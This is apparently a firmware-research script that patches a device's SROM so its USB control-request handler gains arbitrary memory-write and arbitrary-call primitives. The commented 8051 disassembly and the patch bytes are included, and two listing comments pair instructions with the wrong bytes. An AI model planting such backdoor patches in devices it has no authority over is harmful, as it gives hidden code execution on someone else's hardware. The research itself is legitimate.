#!/usr/bin/env python3
#
# https://github.com/xairy/lights-out
#
# Author: Andrey Konovalov

# At 0xb4d3, there's a function that gets called for every USB control request
# sent to the board. The result is returned in R7: 0 means "request not
# supported, 2 means "success" (discovered experimentally).
#
# Original code at 0xb4d3:
#
#                             FUN_CODE_b4d3                                   XREF[1]:     FUN_CODE_b01a:b0fd(c)  
#       CODE:b4d3 90 a2 26        MOV        DPTR,#0xa226
#       CODE:b4d6 e0              MOVX       A,@DPTR=>DAT_EXTMEM_a226
#       CODE:b4d7 b4 40 21        CJNE       A,#0x40,LAB_CODE_b4fb
#       CODE:b4da a3              INC        DPTR
#       CODE:b4db e0              MOVX       A,@DPTR=>DAT_EXTMEM_a227
#       CODE:b4dc 24 33           ADD        A,#0x33
#       CODE:b4de 60 12           JZ         LAB_CODE_b4f2
#       CODE:b4e0 24 cc           ADD        A,#0xcc
#       CODE:b4e2 70 17           JNZ        LAB_CODE_b4fb
#       CODE:b4e4 90 a1 48        MOV        DPTR,#0xa148
#       CODE:b4e7 e0              MOVX       A,@DPTR=>DAT_EXTMEM_a148
#       CODE:b4e8 70 11           JNZ        LAB_CODE_b4fb
#       CODE:b4ea 90 a0 d5        MOV        DPTR,#0xa0d5
#       CODE:b4ed 04              INC        A
#       CODE:b4ee f0              MOVX       @DPTR=>DAT_EXTMEM_a0d5,A
#       CODE:b4ef 7f 00           MOV        R7,#0x0
#       CODE:b4f1 22              RET
#                             LAB_CODE_b4f2                                   XREF[1]:     CODE:b4de(j)  
#       CODE:b4f2 90 a5 7a        MOV        DPTR,#0xa57a
#       CODE:b4f5 74 01           MOV        A,#0x1
#       CODE:b4f7 f0              MOVX       @DPTR=>DAT_EXTMEM_a57a,A
#       CODE:b4f8 7f 02           MOV        R7,#0x2
#       CODE:b4fa 22              RET
#                             LAB_CODE_b4fb                                   XREF[3]:     CODE:b4d7(j), CODE:b4e2(j), 
#                                                                                          CODE:b4e8(j)  
#       CODE:b4fb 7f 00           MOV        R7,#0x0
#       CODE:b4fd 22              RET
#
# In this stage, we patch the SROM to change the function at 0xb4d3 to allow:
# 1. Performing arbitrary write via bRequest == 0x42 that puts one byte of data
#    passed in wValue_low at address passed in wIndex;
# 2. Performing artbitrary call via bRequest == 0x41 that calls into an address
#    embedded into the function's code. The address is 0xffff initially, but
#    can be patched via the arbitrary write primitive.
#
# We want to keep the code small to avoid overwriting other functions (the
# function's size is 0x2b bytes). We should be able to safely overwrite R6 (in
# addition to R7 that holds the return value), as it holds a tempopary value
# put there by the function's caller that is not used after the call.
#
# Offsets to the fields of a USB control request kept in XDATA:
#
# 0xa226: bmRequestType
# 0xa227: bRequest
# 0xa228: wValue_high
# 0xa229: wValue_low
# 0xa22a: wIndex_high
# 0xa22b: wIndex_low
# 0xa22c: wLength_high
# 0xa22d: wLength_low
#
# New code at 0xb4d3:
#   0000: MOV DPTR, bmRequestType    |    0x90, 0xa2, 0x26 
#   0003: MOVX A, @DPTR              |    0xe0
#   0004: CJNE A, #0x40, 0x21        |    0xb4, 0x40, 0x21
#   0007: INC DPTR                   |    0xa3
#   0008: MOVX A, @DPTR              |    0xe0
#   0009: ADD A, #0xbe               |    0x24, 0xbe
#   000b: JZ 0x8                     |    0x60, 0x08
#   000d: INC A                      |    0x04
#   000e: JNZ 0x18                   |    0x70, 0x18
#   0010: LCALL, 0xffff              |    0x12, 0xff, 0xff
#   0013: SJMP 0x10                  |    0x80, 0x10
#   0015: INC DPTR                   |    0xa3
#   0016: INC DPTR                   |    0xa3
#   0017: MOVX A, @DPTR              |    0xe0
#   0018: MOV R7, A                  |    0xff
#   0019: INC DPTR                   |    0xa3
#   001a: MOVX A, @DPTR              |    0xe0
#   001b: MOV R6, A                  |    0xfe
#   001c: INC DPTR                   |    0xa3
#   001d: MOVX A, @DPTR              |    0xe0
#   001e: MOV DPL, A                 |    0xf5, 0x82
#   0020: MOV A, R6                  |    0xee
#   0021: MOV DPH, A                 |    0xf5, 0x83
#   0023: MOV A, R7                  |    0xef
#   0024: MOVX @DPTR, A              |    0xf0
#   0025: MOV R7, #0x2               |    0x7f, 0x00
#   0027: RET                        |    0x22
#   0028: MOV R7, #0x0               |    0x7f, 0x02
#   002a: RET                        |    0x22
#
# The address spaces of CODE and XDATA are shared starting from offset 0xb000.

import array
import binascii
import sys
import time

filename_in = sys.argv[1]
filename_out = sys.argv[2]

data = None
with open(filename_in, 'rb') as f:
	data = bytearray(f.read())

def patch_srom_at(offset, patch):
	data[offset : offset + len(patch)] = patch

def patch_code_at(addr, patch):
	assert addr >= 0xb000
	srom_offset = addr - 0xb000 + 0x715
	patch_srom_at(srom_offset, patch)

code = [0x90, 0xa2, 0x26, 0xe0, 0xb4, 0x40, 0x21, 0xa3, 0xe0, 0x24, 0xbe, \
	0x60, 0x08, 0x04, 0x70, 0x18, 0x12, 0xff, 0xff, 0x80, 0x10, 0xa3, \
	0xa3, 0xe0, 0xff, 0xa3, 0xe0, 0xfe, 0xa3, 0xe0, 0xf5, 0x82, 0xee, \
	0xf5, 0x83, 0xef, 0xf0, 0x7f, 0x02, 0x22, 0x7f, 0x00, 0x22]

patch_code_at(0xb4d3, code)

with open(filename_out, 'wb') as f:
	f.write(data)
